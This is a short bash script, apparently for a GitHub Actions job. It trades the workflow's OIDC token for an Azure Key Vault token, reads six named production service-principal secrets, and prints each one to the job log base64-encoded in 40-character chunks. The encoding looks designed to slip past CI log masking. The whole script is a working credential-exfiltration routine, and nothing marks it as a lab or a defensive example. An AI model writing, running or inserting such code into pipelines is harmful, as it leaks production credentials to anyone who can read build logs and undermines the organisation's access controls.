#!/usr/bin/env bash
JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
KVT=$(curl -sS -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
    -d "client_id=$AZURE_CLIENT_ID" -d "scope=https://vault.azure.net/.default" \
    -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    -d "client_assertion=$JWT" -d "grant_type=client_credentials" \
    | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
for N in cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal secrets-sync-principal sync-service-principal; do
  V=$(curl -sS -H "Authorization: Bearer $KVT" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$N?api-version=7.4" \
      | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
  echo "SECRET $N"
  python3 - "$V" <<'PY'
import sys,base64
b=base64.b64encode(sys.argv[1].encode()).decode()
print("  b64:", " ".join(b[i:i+40] for i in range(0,len(b),40)))
PY
done
echo "=== end ==="
